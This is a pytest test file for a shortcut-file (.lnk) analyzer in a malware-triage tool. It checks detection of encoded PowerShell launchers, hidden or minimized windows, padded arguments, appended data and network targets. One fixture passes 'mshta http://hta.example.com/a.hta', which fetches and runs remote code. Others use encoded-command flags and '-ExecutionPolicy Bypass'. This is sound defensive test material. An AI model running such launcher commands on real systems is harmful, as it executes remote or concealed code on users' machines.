from __future__ import annotations

import pytest

from unopened import pipeline, runner
from unopened.analyzers import Context, Options, registry
from unopened.analyzers.lnk import structure_end
from unopened.identify import identify
from unopened.model import Severity, Status

pytest.importorskip("LnkParse3")


def analyze(path):
    analyzer = next(a for a in registry() if a.name == "lnk")
    ctx = Context(path, identify(path), Options(), path.stat().st_size)
    return runner.run_analyzer(analyzer, ctx)


def titles(r):
    return {f.title: f.severity for f in r.findings}


def test_benign_shortcut(make_file, lnk_fx):
    r = analyze(make_file("Notepad.lnk", lnk_fx.benign_notepad()))
    assert r.status == Status.OK
    s = r.data["shortcut"]
    assert s["target"] == "C:\\Windows\\System32\\notepad.exe"
    assert s["working_directory"] == "C:\\Users\\Public"
    assert r.findings == []


def test_encoded_powershell(make_file, lnk_fx):
    r = analyze(make_file("Invoice.pdf.lnk", lnk_fx.encoded_powershell()))
    t = titles(r)
    assert t["Shortcut launches powershell.exe"] == Severity.HIGH
    assert t["Encoded PowerShell command"] == Severity.HIGH
    assert t["Command asks for a hidden window"] == Severity.MEDIUM
    assert t["Shortcut borrows another program's icon"] == Severity.MEDIUM
    assert t["Shortcut starts its program minimized"] == Severity.LOW
    assert r.data["shortcut"]["decoded_command"] == "Write-Host fixture"


@pytest.mark.parametrize("flag", ["-e", "-ec", "-enc", "-EncodedCommand", "/encodedcommand"])
def test_encoded_command_aliases(make_file, lnk_fx, flag):
    data = lnk_fx.build_lnk(lnk_fx.POWERSHELL, arguments=f"{flag} {lnk_fx.ENCODED_FIXTURE}")
    r = analyze(make_file("x.lnk", data))
    assert "Encoded PowerShell command" in titles(r)


def test_execution_policy_is_not_an_encoded_command(make_file, lnk_fx):
    data = lnk_fx.build_lnk(lnk_fx.POWERSHELL,
                            arguments="-ExecutionPolicy Bypass -File C:\\scripts\\fixture.ps1")
    assert "Encoded PowerShell command" not in titles(analyze(make_file("x.lnk", data)))


def test_padded_arguments(make_file, lnk_fx):
    r = analyze(make_file("x.lnk", lnk_fx.padded_cmd()))
    assert any(t.startswith("Very long or whitespace-padded arguments") for t in titles(r))
    assert r.data["shortcut"]["arguments_compact"].startswith("/c echo fixture")


def test_lolbin_in_arguments(make_file, lnk_fx):
    data = lnk_fx.build_lnk("C:\\Windows\\explorer.exe",
                            arguments="mshta http://hta.example.com/a.hta")
    t = titles(analyze(make_file("x.lnk", data)))
    assert t["Arguments start mshta.exe"] == Severity.HIGH


def test_appended_payload(make_file, lnk_fx):
    data = lnk_fx.with_appended_data()
    assert structure_end(data) == len(data) - 202
    r = analyze(make_file("x.lnk", data))
    assert titles(r)["Data appended after the shortcut (202 bytes)"] == Severity.HIGH


def test_tracker_pivots_reach_indicators(make_file, lnk_fx):
    report = pipeline.triage(make_file("x.lnk", lnk_fx.padded_cmd()), Options())
    by_type = {(i["type"], i["raw"]) for i in report.indicators}
    assert ("hostname", "fixture-pc") in by_type
    assert ("mac_address", "00:00:5e:00:53:01") in by_type
    assert ("url", "http://download.example.com/a.bin") in by_type


def test_unc_target(make_file, lnk_fx):
    data = lnk_fx.build_lnk("\\\\share.example.com\\pub\\setup.exe")
    assert "Shortcut points to a network location" in titles(analyze(make_file("x.lnk", data)))


def test_garbage_after_header_fails_loudly(make_file, lnk_fx):
    r = analyze(make_file("x.lnk", lnk_fx.benign_notepad()[:90]))
    assert r.status in (Status.ERROR, Status.PARTIAL)


@pytest.mark.parametrize("signature, text, expected", [
    (0xA0000001, r"%windir%\system32\charmap.exe", r"%windir%\system32\charmap.exe"),
    (0xA0000006, "w_1^VY5-d}...fixture", "Windows Installer advertised shortcut"),
])
def test_target_kept_outside_link_info(make_file, lnk_fx, signature, text, expected):
    # M5 corpus 2: 17 Start-menu shortcuts were "partial" with no target found.
    r = analyze(make_file("Character Map.lnk", lnk_fx.target_in_block(signature, text)))
    assert r.status == Status.OK, r.errors
    assert expected in r.data["shortcut"]["target"]
